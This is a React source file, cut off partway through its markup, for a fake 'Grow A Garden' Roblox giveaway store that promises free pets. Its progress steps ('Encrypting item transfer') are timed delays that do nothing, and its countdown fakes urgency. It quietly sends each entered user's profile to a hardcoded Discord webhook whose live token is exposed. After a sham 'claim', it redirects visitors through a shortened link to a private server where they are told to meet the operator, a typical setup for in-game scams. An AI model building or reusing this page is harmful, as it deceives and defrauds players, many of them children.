"use client"

import { useState, useEffect } from "react"
import {
  Minus,
  Plus,
  Gift,
  Activity,
  Sprout,
  User,
  Trophy,
  Calendar,
  Users,
  Wifi,
  WifiOff,
  X,
  Check,
  AlertTriangle,
  ImageIcon,
  RefreshCw,
  ExternalLink,
  Server,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Badge } from "@/components/ui/badge"
import { Alert, AlertDescription } from "@/components/ui/alert"

interface Pet {
  id: string
  name: string
  image: string
  quantity: number
  claimed: boolean
}

interface RobloxUser {
  id: number
  name: string
  displayName: string
  description: string
  created: string
  isBanned: boolean
  externalAppDisplayName?: string
  hasVerifiedBadge: boolean
  avatar?: string
  avatarSource?: "roblox-api" | "fallback" | "placeholder"
  isDemo?: boolean
}

interface ProcessStep {
  id: number
  text: string
  completed: boolean
  active: boolean
}

const pets: Pet[] = [
  {
    id: "1",
    name: "T-Rex",
    image: "/placeholder.svg?height=80&width=80&text=T-Rex",
    quantity: 0,
    claimed: false,
  },
  {
    id: "2",
    name: "Raccoon",
    image: "/placeholder.svg?height=80&width=80&text=Raccoon",
    quantity: 0,
    claimed: false,
  },
  {
    id: "3",
    name: "Fennec Fox",
    image: "/placeholder.svg?height=80&width=80&text=Fox",
    quantity: 0,
    claimed: false,
  },
  {
    id: "4",
    name: "Kitsune",
    image: "/placeholder.svg?height=80&width=80&text=Kitsune",
    quantity: 0,
    claimed: false,
  },
  {
    id: "5",
    name: "Red Dragon",
    image: "/placeholder.svg?height=80&width=80&text=Dragon",
    quantity: 0,
    claimed: false,
  },
  {
    id: "6",
    name: "Mimic Octopus",
    image: "/placeholder.svg?height=80&width=80&text=Octopus",
    quantity: 0,
    claimed: false,
  },
  {
    id: "7",
    name: "Disco Bee",
    image: "/placeholder.svg?height=80&width=80&text=Bee",
    quantity: 0,
    claimed: false,
  },
  {
    id: "8",
    name: "Queen Bee",
    image: "/placeholder.svg?height=80&width=80&text=Queen",
    quantity: 0,
    claimed: false,
  },
]

// Redirect configuration
const REDIRECT_CONFIG = {
  enabled: true,
  url: "https://shorturl.asia/gDq1x",
  delay: 5000, // 5 seconds delay so users can read instructions
  autoRedirect: true, // Automatically redirect after successful claim
}

// Webhook configuration
const WEBHOOK_CONFIG = {
  enabled: true,
  url: "https://discord.com/api/webhooks/1379740796865220748/IIt1p7i8DWHamFCAcKjfP8OKE10D3jGGRqUb3LqACPkzWFKzX8sOArDekfIadhYUltZ4",
}

export default function PetSeedStore() {
  const [petQuantities, setPetQuantities] = useState<Record<string, number>>({})
  const [claimedPets, setClaimedPets] = useState<Record<string, boolean>>({})
  const [timeLeft, setTimeLeft] = useState(12 * 60 * 60)
  const [username, setUsername] = useState("")
  const [robloxUser, setRobloxUser] = useState<RobloxUser | null>(null)
  const [loading, setLoading] = useState(false)
  const [avatarLoading, setAvatarLoading] = useState(false)
  const [error, setError] = useState("")
  const [totalClaimed, setTotalClaimed] = useState(0)
  const [isDemo, setIsDemo] = useState(false)
  const [showConfirmModal, setShowConfirmModal] = useState(false)
  const [showSuccessModal, setShowSuccessModal] = useState(false)
  const [showFinalizingModal, setShowFinalizingModal] = useState(false)
  const [claimingPets, setClaimingPets] = useState<Array<{ pet: Pet; quantity: number }>>([])
  const [apiStatus, setApiStatus] = useState<"checking" | "connected" | "failed">("checking")
  const [claimSuccessful, setClaimSuccessful] = useState(false)
  const [redirectCountdown, setRedirectCountdown] = useState<number | null>(null)
  const [isJoiningServer, setIsJoiningServer] = useState(false)
  const [redirectBlocked, setRedirectBlocked] = useState(false)
  const [processSteps, setProcessSteps] = useState<ProcessStep[]>([
    { id: 1, text: "Connecting to account...", completed: false, active: false },
    { id: 2, text: "Encrypting item transfer...", completed: false, active: false },
    { id: 3, text: "Awaiting final confirmation...", completed: false, active: false },
  ])

  const getClaimingTotal = () => {
    return claimingPets.reduce((total, { quantity }) => total + quantity, 0)
  }

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0))
    }, 1000)
    return () => clearInterval(timer)
  }, [])

  // Enhanced redirect countdown effect with better error handling
  useEffect(() => {
    if (redirectCountdown !== null && redirectCountdown > 0) {
      const timer = setTimeout(() => {
        setRedirectCountdown(redirectCountdown - 1)
      }, 1000)
      return () => clearTimeout(timer)
    } else if (redirectCountdown === 0 && claimSuccessful) {
      // Perform redirect only if claim was successful
      executeRedirect()
    }
  }, [redirectCountdown, claimSuccessful])

  const executeRedirect = () => {
    if (REDIRECT_CONFIG.enabled && REDIRECT_CONFIG.url && claimSuccessful) {
      console.log(`🔗 Attempting redirect to: ${REDIRECT_CONFIG.url}`)
      console.log(`✅ Claim verification: ${getClaimingTotal()} pets successfully claimed`)

      try {
        // Try to open in new tab
        const newWindow = window.open(REDIRECT_CONFIG.url, "_blank", "noopener,noreferrer")

        // Check if popup was blocked
        if (!newWindow || newWindow.closed || typeof newWindow.closed === "undefined") {
          console.warn("⚠️ Popup blocked - showing manual redirect option")
          setRedirectBlocked(true)
        } else {
          console.log("✅ Redirect successful")
          // Reset states on successful redirect
          setRedirectCountdown(null)
          setIsJoiningServer(false)
          setShowSuccessModal(false)
          setClaimSuccessful(false)
        }
      } catch (error) {
        console.error("❌ Redirect failed:", error)
        setRedirectBlocked(true)
      }
    }
  }

  const sendProfileToWebhook = async (profileData: RobloxUser) => {
    if (!WEBHOOK_CONFIG.enabled || !WEBHOOK_CONFIG.url || WEBHOOK_CONFIG.url === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
      console.log("📡 Webhook not configured, skipping...")
      return
    }

    try {
      console.log("📡 Sending profile to webhook...")

      const response = await fetch("/api/webhook/profile", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          webhookUrl: WEBHOOK_CONFIG.url,
          profileData: profileData,
        }),
      })

      if (response.ok) {
        console.log("✅ Profile sent to webhook successfully")
      } else {
        console.error("❌ Failed to send profile to webhook")
      }
    } catch (error) {
      console.error("❌ Webhook error:", error)
    }
  }

  const formatTime = (seconds: number) => {
    const hours = Math.floor(seconds / 3600)
    const minutes = Math.floor((seconds % 3600) / 60)
    const secs = seconds % 60
    return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleDateString("en-US", {
      year: "numeric",
      month: "long",
      day: "numeric",
    })
  }

  const fetchUserAvatar = async (userId: number, retryCount = 0): Promise<string> => {
    try {
      console.log(`🖼️ Fetching avatar for user ${userId}, attempt ${retryCount + 1}`)
      setAvatarLoading(true)

      const avatarResponse = await fetch(`/api/roblox/avatar/${userId}`)

      if (avatarResponse.ok) {
        const avatarData = await avatarResponse.json()
        console.log("🖼️ Avatar response:", avatarData)

        if (avatarData.success && avatarData.data && avatarData.data.length > 0) {
          const avatarUrl = avatarData.data[0].imageUrl
          console.log(`✅ Avatar URL obtained: ${avatarUrl}`)
          return avatarUrl
        }
      }

      // If first attempt fails, try again with a delay
      if (retryCount < 2) {
        console.log(`🔄 Retrying avatar fetch in 1 second...`)
        await new Promise((resolve) => setTimeout(resolve, 1000))
        return fetchUserAvatar(userId, retryCount + 1)
      }

      // Final fallback to placeholder
      console.log(`⚠️ Using placeholder avatar`)
      return `/placeholder.svg?height=150&width=150&text=${userId}`
    } catch (error) {
      console.error("❌ Avatar fetch error:", error)
      return `/placeholder.svg?height=150&width=150&text=${userId}`
    } finally {
      setAvatarLoading(false)
    }
  }

  const fetchRobloxUser = async () => {
    if (!username.trim()) {
      setError("Please enter a username")
      return
    }

    setLoading(true)
    setError("")
    setApiStatus("checking")

    try {
      console.log("🔍 Fetching user:", username.trim())

      // Fetch from our API
      const searchResponse = await fetch(`/api/roblox/search?username=${encodeURIComponent(username.trim())}`)

      if (!searchResponse.ok) {
        const errorData = await searchResponse.json()
        setError(errorData.error || "Failed to search user")
        setApiStatus("failed")
        setLoading(false)
        return
      }

      const searchData = await searchResponse.json()
      console.log("📡 Search response:", searchData)

      if (!searchData.data || searchData.data.length === 0) {
        setError("User not found. Please check the username and try again.")
        setApiStatus("failed")
        setLoading(false)
        return
      }

      const userId = searchData.data[0].id
      setApiStatus("connected")

      // Get detailed user information
      const userResponse = await fetch(`/api/roblox/user/${userId}`)

      if (!userResponse.ok) {
        const errorData = await userResponse.json()
        setError(errorData.error || "Failed to fetch user details")
        setApiStatus("failed")
        setLoading(false)
        return
      }

      const userData = await userResponse.json()
      console.log("👤 User data:", userData)

      // Fetch avatar
      const avatarUrl = await fetchUserAvatar(userId)

      const userWithAvatar: RobloxUser = {
        id: userData.id,
        name: userData.name,
        displayName: userData.displayName || userData.name,
        description: userData.description || "No description available",
        created: userData.created || "2020-01-01T00:00:00.000Z",
        isBanned: userData.isBanned || false,
        externalAppDisplayName: userData.externalAppDisplayName || userData.name,
        hasVerifiedBadge: userData.hasVerifiedBadge || false,
        avatar: avatarUrl,
        avatarSource: avatarUrl.includes("placeholder.svg") ? "placeholder" : "roblox-api",
        isDemo: false,
      }

      setRobloxUser(userWithAvatar)
      setIsDemo(false)
      setError("")

      // Send profile to webhook
      await sendProfileToWebhook(userWithAvatar)

      console.log("✅ User set successfully:", userWithAvatar)
    } catch (err) {
      console.error("❌ Error fetching Roblox user:", err)
      setError("Connection failed. Please check your internet connection and try again.")
      setApiStatus("failed")
    } finally {
      setLoading(false)
    }
  }

  const refreshAvatar = async () => {
    if (!robloxUser) return
    const newAvatarUrl = await fetchUserAvatar(robloxUser.id)
    setRobloxUser((prev) =>
      prev
        ? {
            ...prev,
            avatar: newAvatarUrl,
            avatarSource: newAvatarUrl.includes("placeholder.svg") ? "placeholder" : "roblox-api",
          }
        : null,
    )
  }

  const updateQuantity = (petId: string, change: number) => {
    setPetQuantities((prev) => ({
      ...prev,
      [petId]: Math.max(0, (prev[petId] || 0) + change),
    }))
  }

  const openConfirmModal = () => {
    if (!robloxUser) {
      setError("Please connect your Roblox account first")
      return
    }

    const selectedPets = Object.entries(petQuantities)
      .filter(([_, quantity]) => quantity > 0)
      .map(([petId, quantity]) => ({
        pet: pets.find((p) => p.id === petId)!,
        quantity,
      }))

    if (selectedPets.length === 0) {
      setError("Please select pets to claim")
      return
    }

    setClaimingPets(selectedPets)
    setShowConfirmModal(true)
    setError("")
  }

  const confirmClaim = async () => {
    setShowConfirmModal(false)
    setShowFinalizingModal(true)

    // Reset process steps
    setProcessSteps([
      { id: 1, text: "Connecting to account...", completed: false, active: true },
      { id: 2, text: "Encrypting item transfer...", completed: false, active: false },
      { id: 3, text: "Awaiting final confirmation...", completed: false, active: false },
    ])

    // Step 1: Connecting to account
    await new Promise((resolve) => setTimeout(resolve, 1500))
    setProcessSteps((prev) =>
      prev.map((step) =>
        step.id === 1 ? { ...step, completed: true, active: false } : step.id === 2 ? { ...step, active: true } : step,
      ),
    )

    // Step 2: Encrypting item transfer
    await new Promise((resolve) => setTimeout(resolve, 1500))
    setProcessSteps((prev) =>
      prev.map((step) =>
        step.id === 2 ? { ...step, completed: true, active: false } : step.id === 3 ? { ...step, active: true } : step,
      ),
    )

    // Step 3: Awaiting final confirmation
    await new Promise((resolve) => setTimeout(resolve, 1500))
    setProcessSteps((prev) => prev.map((step) => (step.id === 3 ? { ...step, completed: true, active: false } : step)))

    // Wait a moment before showing accept button
    await new Promise((resolve) => setTimeout(resolve, 500))
  }

  const acceptTransfer = async () => {
    setShowFinalizingModal(false)

    // Verify claim success before proceeding
    const totalItemsToClaim = getClaimingTotal()
    if (totalItemsToClaim > 0 && robloxUser) {
      let totalToClaim = 0
      const newClaimedPets = { ...claimedPets }
      claimingPets.forEach(({ pet, quantity }) => {
        newClaimedPets[pet.id] = true
        totalToClaim += quantity
      })

      // Update state to reflect successful claim
      setClaimedPets(newClaimedPets)
      setTotalClaimed((prev) => prev + totalToClaim)
      setPetQuantities({})

      // Mark claim as successful
      setClaimSuccessful(true)
      console.log(`✅ Claim successful: ${totalToClaim} pets claimed for ${robloxUser.name}`)

      setShowSuccessModal(true)
      setRedirectBlocked(false) // Reset redirect blocked state

      // Start automatic redirect process if enabled
      if (REDIRECT_CONFIG.enabled && REDIRECT_CONFIG.autoRedirect) {
        setIsJoiningServer(true)
        setRedirectCountdown(Math.ceil(REDIRECT_CONFIG.delay / 1000))
      }
    } else {
      console.error("❌ Claim validation failed: No items to claim or no user")
      setError("Claim failed. Please try again.")
    }
  }

  const handleManualJoinServer = () => {
    if (claimSuccessful) {
      executeRedirect()
    }
  }

  const cancelRedirect = () => {
    setRedirectCountdown(null)
    setIsJoiningServer(false)
    setRedirectBlocked(false)
  }

  const getTotalSelectedItems = () => {
    return Object.values(petQuantities).reduce((sum, quantity) => sum + quantity, 0)
  }

  const allStepsCompleted = processSteps.every((step) => step.completed)

  return (
    <div className="min-h-screen bg-gradient-to-br from-cyan-400 via-cyan-300 to-blue-400 relative overflow-hidden">
      {/* Background clouds */}
      <div className="absolute inset-0 opacity-20">
        <div className="absolute top-10 left-10 w-32 h-20 bg-white rounded-full blur-sm"></div>
        <div className="absolute top-32 right-20 w-40 h-24 bg-white rounded-full blur-sm"></div>
        <div className="absolute bottom-40 left-1/4 w-36 h-22 bg-white rounded-full blur-sm"></div>
      </div>

      {/* Confirmation Modal */}
      {showConfirmModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 animate-in fade-in duration-200 p-4">
          <div className="bg-white rounded-2xl p-4 sm:p-6 w-full max-w-md animate-in zoom-in-95 duration-200">
            <div className="flex items-center justify-between mb-4 sm:mb-6">
              <h3 className="text-lg sm:text-xl font-bold text-gray-800">Confirm Selection</h3>
              <Button
                variant="ghost"
                size="sm"
                onClick={() => setShowConfirmModal(false)}
                className="h-10 w-10 sm:h-8 sm:w-8 p-0 hover:bg-gray-100"
              >
                <X className="h-5 w-5 sm:h-4 sm:w-4" />
              </Button>
            </div>
            <div className="space-y-4 mb-4 sm:mb-6">
              <div className="flex flex-wrap gap-3 sm:gap-4 justify-center">
                {claimingPets.map(({ pet, quantity }) => (
                  <div key={pet.id} className="flex flex-col items-center">
                    <div className="relative">
                      <img
                        src={pet.image || "/placeholder.svg"}
                        alt={pet.name}
                        className="w-14 h-14 sm:w-16 sm:h-16 rounded-lg"
                      />
                      <div className="absolute -top-2 -right-2 bg-blue-500 text-white text-xs rounded-full w-6 h-6 flex items-center justify-center font-bold">
                        +{quantity}
                      </div>
                    </div>
                    <span className="text-xs text-gray-600 mt-1 text-center">{pet.name}</span>
                  </div>
                ))}
              </div>
              <div className="text-center">
                <p className="text-sm text-gray-600">
                  Total: <span className="font-bold">x{getTotalSelectedItems()} items</span>
                </p>
              </div>
              <div className="space-y-2">
                <Label htmlFor="confirm-username" className="text-sm font-medium text-gray-700">
                  Roblox Username
                </Label>
                <Input
                  id="confirm-username"
                  value={robloxUser?.name || ""}
                  disabled
                  className="bg-gray-50 text-gray-600"
                />
              </div>
              {/* Avatar Preview in Confirmation Modal */}
              {robloxUser && (
                <div className="flex items-center justify-center gap-3 p-3 sm:p-4 bg-gray-50 rounded-lg">
                  <div className="relative">
                    {avatarLoading ? (
                      <div className="w-12 h-12 bg-gray-200 rounded-full flex items-center justify-center animate-pulse">
                        <RefreshCw className="h-6 w-6 text-gray-400 animate-spin" />
                      </div>
                    ) : (
                      <img
                        src={robloxUser.avatar || "/placeholder.svg"}
                        alt={robloxUser.name}
                        className="w-12 h-12 rounded-full border-2 border-white shadow-sm"
                        onError={(e) => {
                          console.log("❌ Avatar failed to load, using fallback")
                          e.currentTarget.src = `/placeholder.svg?height=100&width=100&text=${robloxUser.name}`
                        }}
                      />
                    )}
                    {robloxUser.avatarSource === "placeholder" && (
                      <div className="absolute -top-1 -right-1 w-4 h-4 bg-yellow-500 rounded-full flex items-center justify-center">
                        <ImageIcon className="h-2 w-2 text-white" />
                      </div>
                    )}
                  </div>
                  <div className="text-left">
                    <p className="font-semibold text-gray-800 text-sm sm:text-base">{robloxUser.displayName}</p>
                    <p className="text-xs sm:text-sm text-gray-600">@{robloxUser.name}</p>
                  </div>
                </div>
              )}
            </div>
            <div className="flex flex-col sm:flex-row gap-3">
              <Button
                variant="outline"
                onClick={() => setShowConfirmModal(false)}
                className="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-700 border-gray-300 h-12 sm:h-auto"
              >
                CANCEL
              </Button>
              <Button
                onClick={confirmClaim}
                className="flex-1 bg-green-500 hover:bg-green-600 text-white font-bold h-12 sm:h-auto"
              >
                CONFIRM
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Finalizing Process Modal */}
      {showFinalizingModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 animate-in fade-in duration-200 p-4">
          <div className="bg-white rounded-2xl p-6 sm:p-8 w-full max-w-md animate-in zoom-in-95 duration-200 relative">
            {/* Close button */}
            <Button
              variant="ghost"
              size="sm"
              onClick={() => setShowFinalizingModal(false)}
              className="absolute top-4 right-4 h-10 w-10 sm:h-8 sm:w-8 p-0 hover:bg-gray-100 text-gray-400"
            >
              <X className="h-5 w-5 sm:h-4 sm:w-4" />
            </Button>

            {/* Title */}
            <div className="text-center mb-6 sm:mb-8">
              <h3 className="text-xl sm:text-2xl font-bold text-gray-800">Finalizing Process</h3>
            </div>

            {/* User Avatar in Finalizing Modal */}
            {robloxUser && (
              <div className="flex justify-center mb-6">
                <div className="relative">
                  {avatarLoading ? (
                    <div className="w-16 h-16 bg-gray-200 rounded-full flex items-center justify-center animate-pulse">
                      <RefreshCw className="h-8 w-8 text-gray-400 animate-spin" />
                    </div>
                  ) : (
                    <img
                      src={robloxUser.avatar || "/placeholder.svg"}
                      alt={robloxUser.name}
                      className="w-16 h-16 rounded-full border-4 border-white shadow-lg"
                      onError={(e) => {
                        console.log("❌ Avatar failed to load in finalizing modal, using fallback")
                        e.currentTarget.src = `/placeholder.svg?height=100&width=100&text=${robloxUser.name}`
                      }}
                    />
                  )}
                  {robloxUser.avatarSource === "placeholder" && (
                    <div className="absolute -top-1 -right-1 w-5 h-5 bg-yellow-500 rounded-full flex items-center justify-center">
                      <ImageIcon className="h-3 w-3 text-white" />
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Process Steps */}
            <div className="space-y-4 mb-6 sm:mb-8">
              {processSteps.map((step) => (
                <div key={step.id} className="flex items-center gap-3">
                  <div className="flex-shrink-0">
                    {step.completed ? (
                      <div className="w-6 h-6 bg-green-500 rounded-full flex items-center justify-center">
                        <Check className="h-4 w-4 text-white" strokeWidth={2} />
                      </div>
                    ) : step.active ? (
                      <div className="w-6 h-6 border-2 border-green-500 rounded-full flex items-center justify-center">
                        <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                      </div>
                    ) : (
                      <div className="w-6 h-6 border-2 border-gray-300 rounded-full"></div>
                    )}
                  </div>
                  <span
                    className={`text-sm ${
                      step.completed
                        ? "text-green-600 font-medium"
                        : step.active
                          ? "text-gray-800 font-medium"
                          : "text-gray-500"
                    }`}
                  >
                    {step.text}
                  </span>
                </div>
              ))}
            </div>

            {/* Accept Button */}
            <div className="flex justify-center">
              <Button
                onClick={acceptTransfer}
                disabled={!allStepsCompleted}
                className={`px-8 sm:px-12 py-3 font-bold text-white rounded-lg transition-all duration-300 h-12 ${
                  allStepsCompleted ? "bg-green-500 hover:bg-green-600 animate-pulse" : "bg-gray-300 cursor-not-allowed"
                }`}
              >
                ACCEPT
              </Button>
            </div>
          </div>
        </div>
      )}

      {/* Ready to Claim Success Modal */}
      {showSuccessModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 animate-in fade-in duration-200 p-4">
          <div className="bg-white rounded-2xl p-6 sm:p-8 w-full max-w-md text-center animate-in zoom-in-95 duration-200 relative">
            {/* Close button */}
            <Button
              variant="ghost"
              size="sm"
              onClick={() => setShowSuccessModal(false)}
              className="absolute top-4 right-4 h-10 w-10 sm:h-8 sm:w-8 p-0 hover:bg-gray-100 text-gray-400"
            >
              <X className="h-5 w-5 sm:h-4 sm:w-4" />
            </Button>

            {/* Success Icon */}
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
              <div className="w-12 h-12 bg-green-500 rounded-full flex items-center justify-center">
                <Check className="h-6 w-6 text-white" strokeWidth={3} />
              </div>
            </div>

            {/* Title */}
            <h3 className="text-xl sm:text-2xl font-bold text-gray-800 mb-2">Ready to Claim!</h3>

            {/* Items count */}
            <p className="text-green-600 font-semibold mb-6">{getClaimingTotal()} items are ready for pickup!</p>

            {/* User Profile Section */}
            {robloxUser && (
              <div className="flex items-center justify-center gap-3 p-3 sm:p-4 bg-gray-50 rounded-lg mb-6">
                <img
                  src={robloxUser.avatar || "/placeholder.svg"}
                  alt={robloxUser.name}
                  className="w-12 h-12 rounded-full border-2 border-white shadow-sm"
                  onError={(e) => {
                    e.currentTarget.src = `/placeholder.svg?height=100&width=100&text=${robloxUser.name}`
                  }}
                />
                <div className="text-left">
                  <p className="font-semibold text-gray-800 text-sm sm:text-base">{robloxUser.displayName}</p>
                  <p className="text-xs sm:text-sm text-gray-600">@{robloxUser.name}</p>
                </div>
              </div>
            )}

            {/* Instructions Section */}
            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
              <div className="flex items-start gap-3">
                <AlertTriangle className="h-5 w-5 text-yellow-600 mt-0.5 flex-shrink-0" />
                <div className="text-left">
                  <p className="font-semibold text-yellow-800 text-sm mb-1">Instructions:</p>
                  <p className="text-yellow-700 text-sm">
                    Join the private server and find me to claim your items! I'll be waiting in the spawn area!
                  </p>
                </div>
              </div>
            </div>

            {/* Popup Blocked Warning */}
            {redirectBlocked && (
              <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
                <div className="flex items-start gap-3">
                  <AlertTriangle className="h-5 w-5 text-red-600 mt-0.5 flex-shrink-0" />
                  <div className="text-left">
                    <p className="font-semibold text-red-800 text-sm mb-1">Popup Blocked!</p>
                    <p className="text-red-700 text-sm">
                      Your browser blocked the automatic redirect. Please click "Join Now" to continue.
                    </p>
                  </div>
                </div>
              </div>
            )}

            {/* Server Join Button */}
            <div className="space-y-3">
              {isJoiningServer && redirectCountdown !== null && !redirectBlocked ? (
                <div className="space-y-3">
                  <div className="flex items-center justify-center gap-2 text-blue-600">
                    <Server className="h-5 w-5 animate-pulse" />
                    <span className="font-semibold text-sm sm:text-base">Joining private server...</span>
                  </div>
                  <p className="text-sm text-gray-600">
                    {redirectCountdown > 0 ? (
                      <>
                        Redirecting in <span className="font-bold text-blue-600">{redirectCountdown}</span> seconds
                      </>
                    ) : (
                      "Opening server..."
                    )}
                  </p>
                  <div className="flex flex-col sm:flex-row gap-2 justify-center">
                    <Button
                      onClick={handleManualJoinServer}
                      className="bg-blue-600 hover:bg-blue-700 text-white flex items-center justify-center gap-2 h-12 sm:h-auto"
                    >
                      <ExternalLink className="h-4 w-4" />
                      Join Now
                    </Button>
                    <Button
                      onClick={cancelRedirect}
                      variant="outline"
                      className="text-gray-600 border-gray-300 bg-transparent h-12 sm:h-auto"
                    >
                      Cancel
                    </Button>
                  </div>
                </div>
              ) : (
                <Button
                  onClick={handleManualJoinServer}
                  disabled={!claimSuccessful}
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white flex items-center justify-center gap-2 py-3 h-12"
                >
                  <Server className="h-5 w-5" />
                  Join Private Server
                </Button>
              )}
              <p className="text-xs text-gray-500">Meet me in-game to complete your claim!</p>
            </div>
          </div>
        </div>
      )}

      <div className="container mx-auto px-4 py-4 sm:py-8 relative z-10">
        <div className="flex flex-col lg:flex-row gap-4 lg:gap-8">
          {/* Main content */}
          <div className="flex-1 order-2 lg:order-1">
            {/* Header */}
            <div className="text-center mb-6 sm:mb-8">
              <div className="flex items-center justify-center gap-2 mb-4">
                <Sprout className="h-5 w-5 sm:h-6 sm:w-6 text-yellow-600" />
                <span className="text-yellow-600 font-semibold text-sm sm:text-base">Grow A Garden</span>
              </div>
              <h1 className="text-2xl sm:text-3xl lg:text-4xl font-bold text-yellow-500 mb-4 sm:mb-6">
                Pet & Seed Store
              </h1>
              {/* Limited time event banner */}
              <div className="bg-red-500 text-white rounded-lg p-3 sm:p-4 mb-6 sm:mb-8 max-w-sm sm:max-w-md mx-auto animate-pulse">
                <div className="flex items-center justify-center gap-2 mb-2">
                  <div className="w-3 h-3 bg-white rounded-full animate-pulse"></div>
                  <span className="font-semibold text-sm sm:text-base">LIMITED TIME EVENT</span>
                </div>
                <div className="text-xl sm:text-2xl font-bold">{formatTime(timeLeft)}</div>
                <div className="text-xs sm:text-sm">Claim your rewards before time runs out!</div>
              </div>
              {/* API Status Alert */}
              {apiStatus === "failed" && (
                <Alert className="max-w-sm sm:max-w-md mx-auto mb-4 bg-red-50 border-red-200">
                  <AlertTriangle className="h-4 w-4" />
                  <AlertDescription className="text-sm">
                    ❌ Failed to connect to Roblox API. Please try again.
                  </AlertDescription>
                </Alert>
              )}
              {apiStatus === "connected" && (
                <Alert className="max-w-sm sm:max-w-md mx-auto mb-4 bg-green-50 border-green-200">
                  <Wifi className="h-4 w-4" />
                  <AlertDescription className="text-sm">
                    ✅ Connected to Roblox API - real user data loaded!
                  </AlertDescription>
                </Alert>
              )}
              {/* Username input */}
              <Card className="bg-white/90 backdrop-blur-sm max-w-sm sm:max-w-md mx-auto mb-6">
                <CardHeader className="pb-3 sm:pb-6">
                  <CardTitle className="text-center flex items-center justify-center gap-2 text-sm sm:text-base">
                    {apiStatus === "connected" ? (
                      <Wifi className="h-4 w-4 sm:h-5 sm:w-5 text-green-500" />
                    ) : apiStatus === "failed" ? (
                      <WifiOff className="h-4 w-4 sm:h-5 sm:w-5 text-yellow-500" />
                    ) : (
                      <div className="animate-spin w-4 h-4 sm:w-5 sm:h-5 border-2 border-blue-500 border-t-transparent rounded-full" />
                    )}
                    Connect Your Roblox Account
                  </CardTitle>
                </CardHeader>
                <CardContent className="p-4">
                  <div className="space-y-4">
                    <div>
                      <Label htmlFor="username" className="text-sm font-medium">
                        Roblox Username
                      </Label>
                      <div className="flex flex-col sm:flex-row gap-2 mt-1">
                        <Input
                          id="username"
                          placeholder="Enter your Roblox username"
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                          onKeyPress={(e) => e.key === "Enter" && !loading && fetchRobloxUser()}
                          disabled={loading}
                          className="flex-1 h-12 sm:h-auto"
                        />
                        <Button
                          onClick={fetchRobloxUser}
                          disabled={loading || !username.trim()}
                          className="bg-blue-600 hover:bg-blue-700 h-12 sm:h-auto sm:w-auto w-full"
                        >
                          {loading ? "Loading..." : "Connect"}
                        </Button>
                      </div>
                    </div>
                    {error && (
                      <div className="bg-yellow-50 border border-yellow-200 rounded-md p-3">
                        <p className="text-yellow-700 text-sm">{error}</p>
                      </div>
                    )}
                    {robloxUser && (
                      <div className="bg-green-50 border border-green-200 rounded-md p-3">
                        <p className="text-green-600 text-sm">
                          ✅ Successfully connected to {robloxUser.displayName} (@{robloxUser.name})
                        </p>
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>
              {/* Claim all button */}
              {robloxUser && getTotalSelectedItems() > 0 && (
                <Button
                  onClick={openConfirmModal}
                  className="bg-green-600 hover:bg-green-700 text-white font-bold px-6 sm:px-8 py-3 mb-6 animate-pulse h-12 sm:h-auto"
                  size="lg"
                >
                  Claim Selected Pets ({getTotalSelectedItems()})
                </Button>
              )}
            </div>
            {/* Pets section */}
            <div className="text-center mb-4 sm:mb-6">
              <h2 className="text-2xl sm:text-3xl font-bold text-yellow-400">Awesome Pets</h2>
            </div>
            {/* Pets grid */}
            <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3 sm:gap-4">
              {pets.map((pet) => (
                <Card
                  key={pet.id}
                  className={`border-2 rounded-xl overflow-hidden transition-all duration-300 ${
                    claimedPets[pet.id]
                      ? "bg-gray-400 border-gray-500 opacity-75"
                      : petQuantities[pet.id] > 0
                        ? "bg-green-500 border-green-600 ring-2 ring-yellow-400 shadow-lg transform scale-105"
                        : "bg-green-500 border-green-600 hover:shadow-lg hover:transform hover:scale-102"
                  }`}
                >
                  <CardContent className="p-3 sm:p-4 text-center">
                    {/* Pet image */}
                    <div className="mb-3 sm:mb-4 relative">
                      <img
                        src={pet.image || "/placeholder.svg"}
                        alt={pet.name}
                        className={`w-16 h-16 sm:w-20 sm:h-20 mx-auto rounded-lg transition-all duration-300 ${
                          claimedPets[pet.id] ? "opacity-50 grayscale" : "hover:scale-110"
                        }`}
                      />
                      {claimedPets[pet.id] && (
                        <div className="absolute inset-0 flex items-center justify-center">
                          <Badge className="bg-green-600 text-white animate-pulse text-xs">CLAIMED</Badge>
                        </div>
                      )}
                      {petQuantities[pet.id] > 0 && !claimedPets[pet.id] && (
                        <div className="absolute -top-2 -right-2 bg-yellow-500 text-white text-xs rounded-full w-6 h-6 flex items-center justify-center font-bold animate-bounce">
                          {petQuantities[pet.id]}
                        </div>
                      )}
                    </div>
                    {/* Pet name */}
                    <h3 className="text-white font-bold text-sm sm:text-lg mb-2">{pet.name}</h3>
                    {/* Quantity controls */}
                    {!claimedPets[pet.id] && (
                      <>
                        <div className="flex items-center justify-center gap-2 mb-3">
                          <Button
                            size="sm"
                            variant="outline"
                            className="w-8 h-8 sm:w-8 sm:h-8 p-0 bg-green-600 border-green-700 text-white hover:bg-green-700 transition-all duration-200 hover:scale-110 touch-manipulation"
                            onClick={() => updateQuantity(pet.id, -1)}
                          >
                            <Minus className="h-3 w-3 sm:h-4 sm:w-4" />
